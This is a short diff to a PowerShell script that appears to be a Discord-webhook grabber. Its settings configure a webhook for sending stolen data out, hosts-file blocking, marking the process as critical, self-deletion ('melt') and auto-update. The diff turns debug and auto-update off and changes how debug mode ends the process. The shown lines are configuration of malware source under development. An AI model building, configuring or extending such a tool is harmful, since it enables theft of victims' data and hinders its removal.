@@ -1,6 +1,6 @@
 $webhook = "YOUR_WEBHOOK_HERE" # DONT USE THIS IF YOU ENABLE AUTO UPDATE INSTEAD REPLACE "PUT YOUR WEBHOOK HERE IF YOU NEED AUTOUPDATE" WITH YOUR DISCORD WEBHOOK
-$debug = $true
-$autoupdate = $true
+$debug = $false
+$autoupdate = $false
 $blockhostsfile = $true
 $criticalprocess = $true
 $melt = $false
@@ -1170,7 +1170,7 @@ if (CHECK_AND_PATCH -eq $true) {
         AUTOUPDATE
     }    
     if ($debug) {
-        exit
+        Write-Host "[!] Terminate This Process and observe the next one"
     } else {
         [ProcessUtility]::MakeProcessKillable()
     }
